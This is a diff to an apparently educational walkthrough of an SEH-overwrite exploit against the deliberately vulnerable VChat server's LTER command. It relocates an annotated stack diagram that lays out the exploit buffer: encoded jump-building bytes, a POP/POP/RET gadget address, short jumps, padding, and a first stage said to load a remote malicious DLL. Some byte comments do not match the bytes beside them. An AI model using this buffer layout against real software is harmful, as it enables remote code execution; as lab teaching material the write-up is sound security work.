@@ -453,57 +453,6 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/6a5b6fa3-0a6a-4a59-9b39-e860f33072dc
 
 
-
-```
-|------------------------------------------------------------|
-|    b'\x50'                                                 | # PUSH EAX
-|    b'\x05\x76\x40\x48\x48'                                 | # ADD EAX,48484076
-|    b'\x05\x75\x40\x48\x48'                                 | # ADD EAX,48484075 
-|    b'\x25\x35\x32\x31\x2a'                                 | # AND EAX,0x2A313235
-|    b'\x25\x4a\x4d\x4e\x55'                                 | # AND EAX,0x554E4D4A
-|    b'\x5c'                                                 | # POP ESP
-|    b'\x50'                                                 | # PUSH EAX
-|    b'\x66\x05\x1f\x12'                                     | # ADD AX,0x097F
-|    b'\x58'                                                 | # POP EAX
-|    b'\x54'                                                 | # PUSH ESP
-|------------------------------------------------------------|
-|    b'C' * 2                                                |
-|------------------------------------------------------------|
-|    struct.pack('<L', 0x6250103B)                           | # POP EDI # POP EBP # RETN
-|------------------------------------------------------------|
-|    b'\x74\x06'                                             | # JZ SHORT +0x8
-|    b'\x75\x08'                                             | # JNZ SHORT +0x10
-|------------------------------------------------------------|
-|    b'A' * (79 - (6 + len(JUMP_ENCODE)))                    |
-|------------------------------------------------------------|
-|    JUMP_ENCODE                                             |
-|------------------------------------------------------------|
-|    b'\x5c'                                                 | # POP ESP
-|    b'\x50'                                                 | # PUSH EAX
-|    b'\x2c\x30'                                             | # SUB AL,30
-|    b'\x58'                                                 | # POP EAX
-|    b'\x54'                                                 | # PUSH ESP
-|    b'A' * (3574 - (16 + 20 + 79 + 4 + len(FIRST_STAGE)))   | 
-|------------------------------------------------------------|
-|    FIRST_STAGE                                             |
-|------------------------------------------------------------|
-|    b'\x5c'                                                 | # POP ESP
-|    b'\x50'                                                 | # PUSH EAX
-|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
-|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
-|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
-|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
-|    b'\x58'                                                 | # POP EAX
-|    b'\x54'                                                 | # PUSH ESP
-|------------------------------------------------------------|
-|    b'A' * 16                                               |
-|------------------------------------------------------------|
-|    b'LTER .'                                               |
-|------------------------------------------------------------|
-```
-
-
-
 #### Long Jump and Encoding
 1. Now, we have jumped onto the part of the buffer that contains our `C`s, and this region only has 41 bytes of space available, as this is not much space we will perform a *Long Jump* in order to leverage the larger region of space located earlier in the buffer. In the [GMON_SEH](https://github.com/DaintyJet/VChat_GMON_SEH) exploit, we performed a long jump as shown below:
 
@@ -1225,6 +1174,64 @@ With the second stage prepped and exposed on our network, we can perform the fin
 	* `.`: This is the current directory we are in, we can specify a path to share a specific directory.
 
 5. Run the [exploit13a-DLL.py](./SourceCode/exploit13-DLL.py) program, and open the terminal you have the netcat listener on!
+
+
+**Note**
+The diagram below shows the stack when the malcious string is injected into vchat.exe. The SEH gadget runs the two jump short
+instructions and jumps above to the instructions that create a jump instruction. This jump instruction is to jump back and run JUMP_ENCODE, which jumps to the start of our buffer, where the first stage code FIRST_STAGE is located. FIRST_STAGE will load the remote malicious dll and performs the attack.
+
+The hard part to understand is we use instructions to create the jump instructions.
+
+```
+|                                                            | -③---------------------------------------
+|------------------------------------------------------------|                                         |
+|    b'\x50'                                                 | # PUSH EAX                              |
+|    b'\x05\x76\x40\x48\x48'                                 | # ADD EAX,48484076                      |
+|    b'\x05\x75\x40\x48\x48'                                 | # ADD EAX,48484075                      |
+|    b'\x25\x35\x32\x31\x2a'                                 | # AND EAX,0x2A313235                    |
+|    b'\x25\x4a\x4d\x4e\x55'                                 | # AND EAX,0x554E4D4A                    |
+|    b'\x5c'                                                 | # POP ESP                               |
+|    b'\x50'                                                 | # PUSH EAX                              |
+|    b'\x66\x05\x64\x12'                                     | # ADD AX,0x097F                         |
+|    b'\x58'                                                 | # POP EAX                               |
+|    b'\x54'                                                 | # PUSH ESP                              |
+|------------------------------------------------------------|<--------------------|                   |
+|    b'C' * 2                                                |                     |                   |
+|------------------------------------------------------------|                     |                   |
+|    struct.pack('<L', 0x6250271B)                           | # POP EDI # POP EBP # RETN -①-|         |
+|------------------------------------------------------------|                     |         |         |
+|    b'\x74\x06'                                             | # JZ SHORT +0x8  -②-|         |         |
+|    b'\x75\x08'                                             | # JNZ SHORT +0x10 <-----------|         | 
+|------------------------------------------------------------|                                         |
+|    b'A' * (79 - (6 + len(JUMP_ENCODE)))                    | -④------------------|                   |
+|------------------------------------------------------------|                     |                   |
+|    JUMP_ENCODE                                             |                     |                   |
+|------------------------------------------------------------|                     |                   |
+|    b'\x5c'                                                 | # POP ESP           |                   |
+|    b'\x50'                                                 | # PUSH EAX          |                   |
+|    b'\x2c\x30'                                             | # SUB AL,30         |                   |
+|    b'\x58'                                                 | # POP EAX           |                   |
+|    b'\x54'                                                 | # PUSH ESP <----------------------------|
+|    b'A' * (3574 - (64 + 20 + 79 + 4 + len(FIRST_STAGE)))   |                     |  
+|------------------------------------------------------------|                     |
+|    FIRST_STAGE                                             |                     |
+|------------------------------------------------------------|                     |
+|    b'\x5c'                                                 | # POP ESP           |
+|    b'\x50'                                                 | # PUSH EAX          |
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269     |
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269     |
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269     |
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269     |
+|    b'\x58'                                                 | # POP EAX           |
+|    b'\x54'                                                 | # PUSH ESP          |
+|------------------------------------------------------------|<--------------------|
+|    b'A' * 64                                               |
+|------------------------------------------------------------|
+|    b'LTER .'                                               |
+|------------------------------------------------------------|
+```
+
+
 #### Multi-Stage
 > [!NOTE]
 > I have observed that the first stage shellcode will work as expected and can guess all of the possible file descriptors for the program's socket. It is likely the case that Windows's behavior chnages when a SEH exception is raised compared to the enviorment the execution enviornment the original [KSTET_Multi](https://github.com/DaintyJet/VChat_KSTET_Multi) attack occurs in.
